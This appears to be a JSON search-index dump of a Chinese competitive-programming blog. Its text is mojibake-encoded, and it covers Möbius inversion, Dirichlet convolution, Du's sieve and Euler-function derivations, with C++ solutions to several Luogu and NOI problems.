å…ˆå¯¹æ¬§æ‹‰å‡½æ•°ç”¨è«æ¯”ä¹Œæ–¯åæ¼” $$\\sum_{i=1} ^{n}\\varphi(i)$$ å±•å¼€æ¬§æ‹‰å‡½æ•° $$\\sum_{i=1} ^{n} \\sum_{j = 1} ^{n} [\\gcd(i,j)=1]$$ è«æ¯”ä¹Œæ–¯åæ¼” $$\\sum_{i=1}^{n} \\sum_{j = 1} ^{n} \\sum_{d \\mid \\gcd(i,j)}\\mu(d)$$ äº¤æ¢æ±‚å’Œæ¬¡åº $$\\sum_{d=1} ^{n}\\mu(d) \\lfloor \\frac{n}{d} \\rfloor ^2$$ é‚£ä¹ˆå°±å¯ä»¥ç”¨å‰é¢çš„è«æ¯”ä¹Œæ–¯å‡½æ•°å‰ç¼€å’Œæ¥æ±‚è§£äº† æ³¨æ„è¦å‡å» $i=1,j=1$ çš„æƒ…å†µï¼Œå¹¶ä¸” $/2$ æ³•äºŒï¼š ç”±ç‹„åˆ©å…‹é›·å·ç§¯ $$Id = \\varphi * I$$ è®¾ $h = Id,f=\\varphi,g=I$ å¥—ç”¨æœæ•™ç­› $$S(n) = \\sum_{i=1} ^{n}Id(i)-\\sum_{i=2}^{n} I(i)S(\\lfloor\\frac{n}{i} \\rfloor)$$ $$S(n) = \\sum_{i=1} ^{n}i-\\sum_{i=2}^{n} S(\\lfloor\\frac{n}{i} \\rfloor)$$ ç­‰å·®æ•°åˆ—æ±‚å’Œ $$S(n) = \\frac{n (n + 1)}{2} - \\sum_{i=2}^{n} S(\\lfloor\\frac{n}{i} \\rfloor)$$ ","date":"2021-09-13","objectID":"/posts/cp%E6%9D%9C%E6%95%99%E7%AD%9B/:3:0","tags":["æ•°è®º","æœæ•™ç­›"],"title":"æœæ•™ç­›","uri":"/posts/cp%E6%9D%9C%E6%95%99%E7%AD%9B/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç (ä¸¤ä¸ªå‡½æ•°ä¸€èµ·æ±‚)ï¼š é¢˜ç›®ï¼šæ´›è°·P4213 #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 2e6 + 5; int T, n, mobius[N], primes[N], cnt, sum[N]; bool st[N]; unordered_map\u003cint, int\u003e mp; void get_mobius(int n) { mobius[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; mobius[i] = -1; } for (int j = 0; primes[j] * i \u003c= n; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { mobius[t] = 0; break; } mobius[t] = -mobius[i]; } } for (int i = 1; i \u003c= n; i ++) sum[i] = sum[i - 1] + mobius[i]; } int sum_mobius(int n) { if (n \u003c N) return sum[n]; if (mp[n]) return mp[n]; int res = 1; for (int l = 2, r; l \u003c= n; l = r + 1) { r = n / (n / l); res -= sum_mobius(n / l) * (r - l + 1); } return mp[n] = res; } int sum_phi(int n) { int res = 0; for (int l = 1, r; l \u003c= n; l = r + 1) { r = n / (n / l); res += (sum_mobius(r) - sum_mobius(l - 1)) * (n / l) * (n / l); } return (res - 1) / 2 + 1; } signed main() { get_mobius(N - 1); cin \u003e\u003e T; while (T --) { cin \u003e\u003e n; cout \u003c\u003c sum_phi(n) \u003c\u003c \" \" \u003c\u003c sum_mobius(n) \u003c\u003c endl; } } ","date":"2021-09-13","objectID":"/posts/cp%E6%9D%9C%E6%95%99%E7%AD%9B/:4:0","tags":["æ•°è®º","æœæ•™ç­›"],"title":"æœæ•™ç­›","uri":"/posts/cp%E6%9D%9C%E6%95%99%E7%AD%9B/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"é¢˜ç›®é“¾æ¥ é¢˜æ„ï¼š æ±‚ $$\\sum_{i = 1} ^{n} \\sum_{j = 1} ^{m} \\text{lcm}(i, j)$$ å¯¹ $20101009$ å–æ¨¡ åˆ†æï¼š é¦–å…ˆ $\\text{lcm}(i, j) = \\dfrac{i \\cdot j}{\\gcd(i,j)}$ ä»£å…¥ï¼š $$\\sum_{i = 1} ^{n} \\sum_{j = 1} ^{m} \\frac{i \\cdot j}{\\gcd(i,j)}$$ æšä¸¾ $\\gcd(i,j)$ $$\\sum_{d = 1} ^{\\min(n,m)}\\sum_{i = 1} ^{n} \\sum_{j = 1} ^{m} \\frac{i \\cdot j}{d}[\\gcd(i,j)=d] $$ æ ¹æ® $\\gcd$ çš„æ€§è´¨ï¼š $$\\sum_{d = 1} ^{\\min(n,m)}\\sum_{i = 1} ^{n} \\sum_{j = 1} ^{m} \\frac{i \\cdot j}{d}[\\gcd(\\frac{i}{d}, \\frac{j}{d}) = 1] $$ åœ¨ $\\dfrac{i \\cdot j}{d}$ ä¸­ é™¤ä¸€ä¸ª $d$ ä¹˜ä¸€ä¸ª $d$ï¼Œæ¥å‡‘å½¢å¼ä¸€è‡´ã€‚ $$\\sum_{d = 1} ^{\\min(n,m)}d \\sum_{i = 1} ^{n} \\sum_{j = 1} ^{m} \\frac{i}{d}\\cdot \\frac{j}{d} [\\gcd(\\frac{i}{d}, \\frac{j}{d}) = 1] $$ æ›¿æ¢ $\\dfrac{i}{d},\\dfrac{j}{d}$ $$\\sum_{d = 1} ^{\\min(n,m)}d \\sum_{i = 1} ^{ \\lfloor \\frac{n}{d} \\rfloor } \\sum_{j = 1} ^{\\lfloor \\frac{m}{d} \\rfloor }i\\cdot j [\\gcd(i, j) = 1]$$ ç”¨å•ä½å‡½æ•°æ›¿æ¢ $$\\sum_{d = 1} ^{\\min(n,m)}d \\sum_{i = 1} ^{ \\lfloor \\frac{n}{d} \\rfloor } \\sum_{j = 1} ^{\\lfloor \\frac{m}{d} \\rfloor }i\\cdot j \\cdot \\varepsilon (\\gcd(i, j) = 1)$$ è«æ¯”ä¹Œæ–¯åæ¼” $$\\sum_{d = 1} ^{\\min(n,m)}d \\sum_{i = 1} ^{ \\lfloor \\frac{n}{d} \\rfloor } \\sum_{j = 1} ^{\\lfloor \\frac{m}{d} \\rfloor }i\\cdot j \\sum_{k \\mid \\gcd(i,j)} \\mu(k)$$ äº¤æ¢æ±‚å’Œæ¬¡åº $$\\sum_{d = 1} ^{\\min(n,m)}d \\sum_{k =1} ^{\\min(\\lfloor \\frac{n}{d} \\rfloor,\\lfloor \\frac{m}{d} \\rfloor)} \\mu(k) \\sum_{i = 1} ^{ \\lfloor \\frac{n}{dk} \\rfloor } i \\cdot k \\sum_{j = 1} ^{\\lfloor \\frac{m}{dk} \\rfloor } j \\cdot k$$ æ•´ç†å¼å­ $$\\frac{1}{4} \\sum_{d = 1} ^{\\min(n,m)}d \\sum_{k =1} ^{\\min(\\lfloor \\frac{n}{d} \\rfloor,\\lfloor \\frac{m}{d} \\rfloor)} k^2 \\mu(k) (\\lfloor \\frac{n}{dk} \\rfloor ^2 + \\lfloor \\frac{n}{dk} \\rfloor) \\cdot (\\lfloor \\frac{m}{dk} \\rfloor ^2 + \\lfloor \\frac{m}{dk} \\rfloor) $$ æ—¶é—´å¤æ‚åº¦ $O(N\\sqrt{N})$ ","date":"2021-09-09","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p1829-crash%E7%9A%84%E6%95%B0%E5%AD%97%E8%A1%A8%E6%A0%BC/:0:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"[æ´›è°· P1829] Crashçš„æ•°å­—è¡¨æ ¼","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p1829-crash%E7%9A%84%E6%95%B0%E5%AD%97%E8%A1%A8%E6%A0%BC/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 1e7 + 5, mod = 20101009; int n, m, mobius[N], primes[N], cnt, res, sum[N]; bool st[N]; void get_mobius(int n) { mobius[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; mobius[i] = -1; } for (int j = 0; primes[j] * i \u003c= n; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { mobius[t] = 0; break; } mobius[t] = -mobius[i]; } } for (int i = 1; i \u003c= n; i ++) sum[i] = (sum[i - 1] + i * i * mobius[i] % mod + mod) % mod; } signed main() { get_mobius(N - 1); cin \u003e\u003e n \u003e\u003e m; for (int d = 1; d \u003c= min(n, m); d ++) { int x = n / d, y = m / d, Sum = 0; for (int l = 1, r; l \u003c= min(x, y); l = r + 1) { r = min(x / (x / l), y / (y / l)); int p = ((x / l) * (x / l) + x / l) / 2 % mod, q = ((y / l) * (y / l) + y / l) / 2 % mod; Sum += (sum[r] - sum[l - 1]) % mod * p % mod * q % mod; Sum = (Sum % mod + mod) % mod; } res = (res + d * Sum) % mod; } cout \u003c\u003c res \u003c\u003c endl; } ","date":"2021-09-09","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p1829-crash%E7%9A%84%E6%95%B0%E5%AD%97%E8%A1%A8%E6%A0%BC/:1:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”"],"title":"[æ´›è°· P1829] Crashçš„æ•°å­—è¡¨æ ¼","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p1829-crash%E7%9A%84%E6%95%B0%E5%AD%97%E8%A1%A8%E6%A0%BC/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"é¢˜ç›®é“¾æ¥ é¢˜æ„ï¼š æ±‚ $$\\sum_{i=1} ^{n} \\text{lcm}(i,n)$$ åˆ†æï¼š ","date":"2021-09-08","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p1891-%E7%96%AF%E7%8B%82-lcm/:0:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æ¬§æ‹‰å‡½æ•°"],"title":"[æ´›è°· P1891] ç–¯ç‹‚ LCM","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p1891-%E7%96%AF%E7%8B%82-lcm/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ³•ä¸€ï¼šæ¬§æ‹‰å‡½æ•° æ‹†ä¸€ä¸‹ $\\text{lcm}(i,n) = \\dfrac{i \\cdot n}{\\gcd{(i,n)}}$ å˜ä¸ºï¼š $$\\sum_{i=1} ^{n} \\frac{i \\cdot n}{\\gcd{(i,n)}}$$ æšä¸¾ $\\gcd(i,n)$ï¼š $$n \\sum_{d \\mid n} \\sum_{i=1} ^{n} \\frac{i }{d}[\\gcd{(i,n)} = d ]$$ åˆ©ç”¨ $\\gcd$ çš„æ€§è´¨ï¼š $$n \\sum_{d \\mid n} \\sum_{i=1} ^{n} \\frac{i }{d}[\\gcd{(\\frac{i}{d},\\frac{n}{d})} = 1 ]$$ æŠŠ $d$ æ‹¿åˆ°ä¸Šç•Œ $$n \\sum_{d \\mid n} \\sum_{i=1} ^{ \\lfloor \\frac{n}{d} \\rfloor } i[\\gcd{(i,\\frac{n}{d})} = 1 ]$$ $\\lfloor \\dfrac{n}{d} \\rfloor$ ç­‰ä»·äº $d$ $$n \\sum_{d \\mid n} \\sum_{i=1} ^{ d } i[\\gcd{(i,d)} = 1 ]$$ ç”±äº $\\gcd(i, d) = \\gcd(d - i,d)$ ï¼Œæ‰€ä»¥å› å­å¿…æˆå¯¹å‡ºç°ï¼ˆé™¤äº†1ï¼‰ï¼Œé‚£ä¹ˆæ€»å…±å‡ºç°äº† $\\dfrac{\\varphi(d)}{2}$ æ¬¡ï¼Œ$d - i + i =d$ï¼Œæ‰€ä»¥å°±æ˜¯ $$n \\sum_{d \\mid n} \\frac{\\varphi(d)}{2} d$$ è¿™æ ·æ—¶é—´å¤æ‚åº¦æ˜¯ $O(N+T\\sqrt{n})$ï¼Œä½†æ˜¯å¯ä»¥ç”¨ç‹„åˆ©å…‹é›·å·ç§¯ä¼˜åŒ–ï¼Œå¯ä»¥åšåˆ° $O(N \\log{N} + T)$ è®¾ $F(x) = \\dfrac{x \\cdot \\varphi(x)}{2}$ åˆ™ç­”æ¡ˆä¸º $n \\cdot F * \\textbf{1}$ï¼Œæ³¨æ„å¤„ç† $d=1$ çš„æƒ…å†µã€‚ ","date":"2021-09-08","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p1891-%E7%96%AF%E7%8B%82-lcm/:1:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æ¬§æ‹‰å‡½æ•°"],"title":"[æ´›è°· P1891] ç–¯ç‹‚ LCM","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p1891-%E7%96%AF%E7%8B%82-lcm/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; int cnt; vector\u003cint\u003e primes, euler, f; vector\u003cbool\u003e st; void init(int n) { f.resize(n + 1), primes.resize(n + 1), euler.resize(n + 1), st.resize(n + 1); euler[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; euler[i] = i - 1; } for (int j = 0; i * primes[j] \u003c= n; j ++) { int t = i * primes[j]; st[t] = 1; if (i % primes[j] == 0) { euler[t] = euler[i] * primes[j]; break; } euler[t] = euler[i] * (primes[j] - 1); } } for (int i = 1; i \u003c= n; i ++) { for (int j = i; j \u003c= n; j += i) { f[j] += (euler[i] * i + 1) / 2; } } } void solve() { int n; cin \u003e\u003e n; cout \u003c\u003c n * f[n] \u003c\u003c \"\\n\"; } signed main() { init(1e6); cin.tie(0) -\u003e sync_with_stdio(0); int T; cin \u003e\u003e T; while (T --) { solve(); } } ","date":"2021-09-08","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p1891-%E7%96%AF%E7%8B%82-lcm/:2:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æ¬§æ‹‰å‡½æ•°"],"title":"[æ´›è°· P1891] ç–¯ç‹‚ LCM","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p1891-%E7%96%AF%E7%8B%82-lcm/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ³•äºŒï¼šè«æ¯”ä¹Œæ–¯åæ¼” è¿˜æ˜¯æ³•ä¸€çš„å¼å­ï¼Œæ¨åˆ°è¿™ä¸€æ­¥ $$n \\sum_{d \\mid n} \\sum_{i=1} ^{ d } i[\\gcd{(i,d)} = 1 ]$$ ç”¨å•ä½å‡½æ•°æ›¿æ¢ $$n \\sum_{d \\mid n} \\sum_{i=1} ^{ d } i \\cdot \\varepsilon (\\gcd{(i,d)})$$ è«æ¯”ä¹Œæ–¯åæ¼” $$n \\sum_{d \\mid n} \\sum_{i=1} ^{ d } i \\sum_{k \\mid \\gcd(i,d) } \\mu(k)$$ äº¤æ¢æšä¸¾æ¬¡åº $$n \\sum_{d \\mid n} \\sum_{k \\mid d} k\\mu(k) \\sum_{i=1} ^ { \\lfloor \\frac{d}{k} \\rfloor } i$$ å¯¹ååŠéƒ¨åˆ†æ±‚å’Œ $$\\frac{n}{2} \\sum_{d \\mid n} \\sum_{k \\mid d} k\\mu(k) (\\lfloor \\frac{d}{k} \\rfloor ^ 2 + \\lfloor \\frac{d}{k} \\rfloor) $$ å¯ä»¥ç”¨ç‹„åˆ©å…‹é›·å·ç§¯ä¼˜åŒ–åˆ° $O(N\\log N +T)$ è®¾ $f(x)=x \\cdot \\mu(x)$ ï¼Œ$g(x)=x^2+x$ï¼Œ$F(x) = f * g$ é‚£ä¹ˆç­”æ¡ˆå°±ä¸ºï¼š $$\\frac{n}{2} \\cdot F * \\textbf {1}$$ ","date":"2021-09-08","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p1891-%E7%96%AF%E7%8B%82-lcm/:3:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æ¬§æ‹‰å‡½æ•°"],"title":"[æ´›è°· P1891] ç–¯ç‹‚ LCM","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p1891-%E7%96%AF%E7%8B%82-lcm/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 1e6 + 5; int T, n, mobius[N], primes[N], cnt, F[N], ans[N]; bool st[N]; void get_mobius(int n) { mobius[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; mobius[i] = -1; } for (int j = 0; primes[j] * i \u003c= n; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { mobius[t] = 0; break; } mobius[t] = -mobius[i]; } } for (int i = 1; i \u003c= n; i ++) { for (int j = i; j \u003c= n; j += i) { F[j] += i * mobius[i] * ((j / i) * (j / i) + (j / i)); } } for (int i = 1; i \u003c= n; i ++) { for (int j = i; j \u003c= n; j += i) { ans[j] += F[i]; } } } signed main() { get_mobius(N - 1); cin \u003e\u003e T; while (T --) { cin \u003e\u003e n; cout \u003c\u003c n * ans[n] / 2 \u003c\u003c endl; } } ","date":"2021-09-08","objectID":"/posts/cp%E6%B4%9B%E8%B0%B7-p1891-%E7%96%AF%E7%8B%82-lcm/:4:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æ¬§æ‹‰å‡½æ•°"],"title":"[æ´›è°· P1891] ç–¯ç‹‚ LCM","uri":"/posts/cp%E6%B4%9B%E8%B0%B7-p1891-%E7%96%AF%E7%8B%82-lcm/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å®šä¹‰ï¼š å¯¹äºä¸¤ä¸ªæ•°è®ºå‡½æ•° $f(x),g(x)$ é‚£ä¹ˆå®ƒä»¬çš„å·ç§¯ $h(x)$ è®°ä½œ $f(x) * g(x)$ï¼Œå¼å­å¦‚ä¸‹ï¼š $$f(x) * g(x) = h(x) = \\sum_{d \\mid n} f(d)g(\\frac{n}{d})$$ ç®€è®°ä¸º $h = f * g$ ","date":"2021-09-06","objectID":"/posts/cp%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E5%8D%B7%E7%A7%AF/:1:0","tags":["æ•°è®º"],"title":"ç‹„åˆ©å…‹é›·å·ç§¯","uri":"/posts/cp%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E5%8D%B7%E7%A7%AF/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ€§è´¨ï¼š äº¤æ¢å¾‹ï¼š $f * g = g * f$ ç»“åˆå¾‹ï¼š $(f * g) * h = f * (g * h)$ åˆ†é…å¾‹ï¼š $(f + g) * h = f * h + g * h$ å•ä½å…ƒï¼š å¯¹ $\\forall f(x), f * \\varepsilon = f$ é€†å…ƒï¼š å¯¹ä¸€ä¸ªéé›¶çš„æ•°è®ºå‡½æ•° $f(x)$ï¼Œå’Œå¦ä¸€ä¸ªæ•°è®ºå‡½æ•° $g(x)$ æ»¡è¶³ $f*g=\\varepsilon$ï¼Œåˆ™ç§° $g(x)$ ä¸º $f(x)$ çš„é€†å…ƒã€‚ $g(x) = \\dfrac{\\varepsilon - \\sum \\limits_{d \\mid x,d \\ne 1} f(d)g(\\dfrac{x}{d})}{f(1)}$ ç§¯æ€§å‡½æ•°çš„é€†å…ƒè¿˜æ˜¯ç§¯æ€§å‡½æ•° ä¸¤ä¸ªç§¯æ€§å‡½æ•°çš„ç‹„åˆ©å…‹é›·å·ç§¯è¿˜æ˜¯ç§¯æ€§å‡½æ•° ","date":"2021-09-06","objectID":"/posts/cp%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E5%8D%B7%E7%A7%AF/:2:0","tags":["æ•°è®º"],"title":"ç‹„åˆ©å…‹é›·å·ç§¯","uri":"/posts/cp%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E5%8D%B7%E7%A7%AF/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å¸¸è§ç§¯æ€§å‡½æ•°ï¼š 1. è«æ¯”ä¹Œæ–¯å‡½æ•°ï¼š$\\mu(x)$ è®¾ $n=p_1^{c_1}\\cdots p_k^{c_k}$ $$\\mu(n)=\\begin{cases} 0,\u0026\\exists i \\in[1,k],c_i \u003e1 \\\\ 1,\u0026k \\equiv 0\\pmod2,\\forall i \\in[1,k],c_i=1\\\\ -1,\u0026k\\equiv1\\pmod2,\\forall i\\in [1,k],c_i=1 \\end{cases}$$ 2. æ¬§æ‹‰å‡½æ•°ï¼š$\\varphi(x)$ $\\varphi(n) = \\sum \\limits_{i=1} ^{n}[\\gcd(i,n) = 1]$ 3. å•ä½å‡½æ•°ï¼š$\\varepsilon(x)$ $\\varepsilon(n) = [n = 1]$ 4. æ’ç­‰å‡½æ•°ï¼š$Id(x)$ $Id(n) = n$ 5. å¸¸æ•°å‡½æ•°ï¼š$I(x)$ $I(n)=1$ 6. çº¦æ•°ä¸ªæ•°å‡½æ•°ï¼š$d(x)$ $d(n)=\\sum \\limits_{i \\mid n}1$ 7. çº¦æ•°å’Œå‡½æ•°ï¼š$\\sigma(x)$ $\\sigma(n)=\\sum \\limits_{d \\mid n} d$ ","date":"2021-09-06","objectID":"/posts/cp%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E5%8D%B7%E7%A7%AF/:3:0","tags":["æ•°è®º"],"title":"ç‹„åˆ©å…‹é›·å·ç§¯","uri":"/posts/cp%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E5%8D%B7%E7%A7%AF/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å¸¸è§å·ç§¯ï¼š 1. $\\varepsilon = \\mu * 1$ $\\varepsilon = [n=1]=\\sum \\limits _{d \\mid n} \\mu (d)$ 2. $d = 1 * 1$ $d(n)=\\sum \\limits_{i \\mid n}1$ 3. $Id * 1 = \\sigma$ $\\sigma(n)=\\sum \\limits_{d \\mid n} d$ 4. $\\mu * Id = \\varphi$ $\\varphi(n)=\\sum \\limits _{d \\mid n} d \\cdot \\mu(\\dfrac{n}{d})$ 5. $\\varphi * 1 = Id$ $Id(n)=\\sum \\limits _{d \\mid n} \\varphi(d)$ ","date":"2021-09-06","objectID":"/posts/cp%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E5%8D%B7%E7%A7%AF/:4:0","tags":["æ•°è®º"],"title":"ç‹„åˆ©å…‹é›·å·ç§¯","uri":"/posts/cp%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E5%8D%B7%E7%A7%AF/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ç‹„åˆ©å…‹é›·å·ç§¯è¯è«æ¯”ä¹Œæ–¯åæ¼”ï¼š å·²çŸ¥ $f = g * 1$ å…¶ä¸­ $1$ çš„é€†å…ƒä¸º $\\mu$ï¼Œæ‰€ä»¥æœ‰ $f * \\mu = g$ ","date":"2021-09-06","objectID":"/posts/cp%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E5%8D%B7%E7%A7%AF/:5:0","tags":["æ•°è®º"],"title":"ç‹„åˆ©å…‹é›·å·ç§¯","uri":"/posts/cp%E7%8B%84%E5%88%A9%E5%85%8B%E9%9B%B7%E5%8D%B7%E7%A7%AF/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"é¢˜ç›®é“¾æ¥ é¢˜æ„ï¼š æ±‚ $$2\\sum_{i=1}^{n}\\sum_{j=1}^{m}\\gcd(i,j)-nm$$ åˆ†æï¼š ","date":"2021-08-24","objectID":"/posts/cpnoi2010-%E8%83%BD%E9%87%8F%E9%87%87%E9%9B%86/:0:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æ¬§æ‹‰åæ¼”"],"title":"[NOI2010] èƒ½é‡é‡‡é›†","uri":"/posts/cpnoi2010-%E8%83%BD%E9%87%8F%E9%87%87%E9%9B%86/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"è«æ¯”ä¹Œæ–¯åæ¼”ï¼š é‚£ä¹ˆåªéœ€è¦æ±‚ $$\\sum_{i=1}^{n}\\sum_{j=1}^{m}\\gcd(i,j)$$ æšä¸¾æ¯ä¸ª $\\gcd(i,j)$ çš„å€¼ $$\\sum_{d=1}^{n}d\\sum_{i=1}^{n}\\sum_{j=1}^{m}[\\gcd(i,j)=d]$$ å†ç”¨è«æ¯”ä¹Œæ–¯åæ¼”ï¼Œå’Œ problem b è¿™é¢˜æ˜¯ä¸€æ ·çš„ $$\\sum_{d=1}^{n}d\\sum_{i=1}^{\\left \\lfloor \\frac{\\min(n,m)}{d} \\right \\rfloor }\\mu(i)\\left \\lfloor \\frac{n}{di} \\right \\rfloor \\left \\lfloor \\frac{m}{di} \\right \\rfloor $$ åé¢å¯ç”¨æ•´é™¤åˆ†å—ã€‚ ","date":"2021-08-24","objectID":"/posts/cpnoi2010-%E8%83%BD%E9%87%8F%E9%87%87%E9%9B%86/:1:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æ¬§æ‹‰åæ¼”"],"title":"[NOI2010] èƒ½é‡é‡‡é›†","uri":"/posts/cpnoi2010-%E8%83%BD%E9%87%8F%E9%87%87%E9%9B%86/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 1e5 + 5; int n, m, mobius[N], primes[N], cnt, res, sum[N]; bool st[N]; void get_mobius(int n) { mobius[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; mobius[i] = -1; } for (int j = 0; primes[j] * i \u003c= n; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { mobius[t] = 0; break; } mobius[t] = -mobius[i]; } } for (int i = 1; i \u003c= n; i ++) sum[i] = sum[i - 1] + mobius[i]; } signed main() { get_mobius(N - 1); cin \u003e\u003e n \u003e\u003e m; for (int d = 1; d \u003c= n; d ++) { int k = min(n, m) / d, ans = 0; for (int l = 1, r; l \u003c= k; l = r + 1) { r = min(n / (n / l), m / (m / l)); ans += (sum[r] - sum[l - 1]) * (n / (d * l)) * (m / (d * l)); } res += d * ans; } cout \u003c\u003c 2 * res - n * m \u003c\u003c endl; } ","date":"2021-08-24","objectID":"/posts/cpnoi2010-%E8%83%BD%E9%87%8F%E9%87%87%E9%9B%86/:2:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æ¬§æ‹‰åæ¼”"],"title":"[NOI2010] èƒ½é‡é‡‡é›†","uri":"/posts/cpnoi2010-%E8%83%BD%E9%87%8F%E9%87%87%E9%9B%86/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ¬§æ‹‰åæ¼”ï¼š å®šç†ï¼š $$n=\\sum_{d \\mid n} \\varphi(d)$$ åŸå¼ä¸º $$\\sum_{i=1}^{n}\\sum_{j=1}^{m}\\gcd(i,j)$$ å°† $\\gcd(i,j)$ å¥—ç”¨æ¬§æ‹‰åæ¼”å®šç† $$\\sum_{i=1}^{n}\\sum_{j=1}^{m} \\sum_{d \\mid \\gcd(i,j)}\\varphi(d)$$ å°† $\\varphi(d)$ æåˆ°å‰é¢ï¼Œæšä¸¾ $d$ $$\\sum_{d=1}^{n}\\varphi(d)\\sum_{i=1}^{n}\\sum_{j=1}^{m}[d \\mid \\gcd(i,j)]$$ åŒ–ç®€åé¢ $$\\sum_{d=1}^{n}\\varphi(d)\\left \\lfloor \\frac{n}{d} \\right \\rfloor \\left \\lfloor \\frac{m}{d} \\right \\rfloor $$ é¢„å¤„ç†æ¬§æ‹‰å‡½æ•°å‰ç¼€å’Œï¼Œç”¨æ•´é™¤åˆ†å—å³å¯ã€‚ ","date":"2021-08-24","objectID":"/posts/cpnoi2010-%E8%83%BD%E9%87%8F%E9%87%87%E9%9B%86/:3:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æ¬§æ‹‰åæ¼”"],"title":"[NOI2010] èƒ½é‡é‡‡é›†","uri":"/posts/cpnoi2010-%E8%83%BD%E9%87%8F%E9%87%87%E9%9B%86/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; const int N = 1e5 + 5; int n, m, primes[N], euler[N], cnt, res, sum[N]; bool st[N]; void get_eulers(int n) { euler[1] = 1; for (int i = 2; i \u003c= n; i ++) { if (!st[i]) { primes[cnt ++] = i; euler[i] = i - 1; } for (int j = 0; primes[j] \u003c= n / i; j ++) { int t = primes[j] * i; st[t] = 1; if (i % primes[j] == 0) { euler[t] = primes[j] * euler[i]; break; } euler[t] = (primes[j] - 1) * euler[i]; } } for (int i = 1; i \u003c= n; i ++) sum[i] = sum[i - 1] + euler[i]; } signed main() { get_eulers(N - 1); cin \u003e\u003e n \u003e\u003e m; for (int l = 1, r; l \u003c= min(n, m); l = r + 1) { r = min(n / (n / l), m / (m / l)); res += (sum[r] - sum[l - 1]) * (n / l) * (m / l); } cout \u003c\u003c 2 * res - n * m \u003c\u003c endl; } ","date":"2021-08-24","objectID":"/posts/cpnoi2010-%E8%83%BD%E9%87%8F%E9%87%87%E9%9B%86/:4:0","tags":["è«æ¯”ä¹Œæ–¯åæ¼”","æ¬§æ‹‰åæ¼”"],"title":"[NOI2010] èƒ½é‡é‡‡é›†","uri":"/posts/cpnoi2010-%E8%83%BD%E9%87%8F%E9%87%87%E9%9B%86/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"$\\text{BSGS (Baby Step Giant Step)}:$ ç»™å®šæ­£æ•´æ•° $a,b,p,a \\perp p$ ï¼Œæ±‚æ»¡è¶³ $$a^{x} \\equiv b(\\text{ mod } p)$$ çš„æœ€å°éè´Ÿæ•´æ•° $x$ é¦–å…ˆç”±æ¬§æ‹‰å®šç†çš„æ¨è®ºæœ‰ï¼š $$a^x\\equiv a^{x\\text{ mod }\\varphi (p)}(\\text{ mod }p)$$ æ‰€ä»¥ $a^x$ åœ¨æ¨¡ $p$ æ„ä¹‰ä¸‹çš„æœ€å°å¾ªç¯èŠ‚ä¸º $\\varphi(p)$ 